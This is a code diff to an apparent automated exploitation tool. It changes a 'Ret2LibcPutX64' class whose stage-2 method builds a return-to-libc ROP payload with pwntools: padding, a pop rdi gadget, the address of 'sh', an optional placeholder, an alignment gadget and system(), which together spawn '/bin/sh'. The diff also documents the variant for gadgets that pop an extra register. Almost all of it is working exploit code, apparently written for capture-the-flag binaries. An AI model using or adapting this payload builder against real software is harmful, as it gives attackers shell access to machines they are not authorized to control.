@@ -256,7 +256,16 @@ class Ret2LibcPutX64(ExploitPrimitive):
     def build_stage2_payload(
         self, ctx: ExploitContext, leaked_puts_addr: int,
     ) -> bytes:
-        """Build the stage-2 final payload (``system('/bin/sh')``)."""
+        """Build the stage-2 final payload (``system('/bin/sh')``).
+
+        Mirrors v3.1 ``_legacy.ret2libc_put_x64`` L2010-2017 2-variant
+        cascade (P6.3b fix, B-007 defensive): when ``extra_rdi=1``
+        (``pop rdi; pop <reg>; ret``), v3.1 inserts a 0 placeholder
+        between ``sh`` and ``ret`` to consume the extra slot.  P8.4
+        §2.6 baseline does not exercise this path (no Challenge/
+        binary hits ret2libc_put-x64), but the contract layer must
+        match v3.1 to prevent future binary regressions.
+        """
         from pwn import asm, flat, p64
 
         if ctx.gadgets_x64 is None or ctx.gadgets_x64.pop_rdi == 0 or ctx.gadgets_x64.ret == 0:
@@ -274,11 +283,20 @@ class Ret2LibcPutX64(ExploitPrimitive):
         except (KeyError, AttributeError, StopIteration):
             return b""
 
+        g = ctx.gadgets_x64
+        if g.extra_rdi == 1:
+            # v3.1 L2010-2017: extra_rdi=1 → 0 placeholder between sh and ret
+            return flat(
+                asm("nop") * ctx.padding
+                + p64(g.pop_rdi) + p64(sh_addr) + p64(0)  # 0 placeholder
+                + p64(g.ret)  # stack-alignment gadget
+                + p64(system_addr)
+            )
+        # extra_rdi=0: 4-p64 chain (P6.3 default)
         return flat(
             asm("nop") * ctx.padding
-            + p64(ctx.gadgets_x64.pop_rdi)
-            + p64(sh_addr)
-            + p64(ctx.gadgets_x64.ret)  # stack-alignment gadget
+            + p64(g.pop_rdi) + p64(sh_addr)
+            + p64(g.ret)  # stack-alignment gadget
             + p64(system_addr)
         )
 
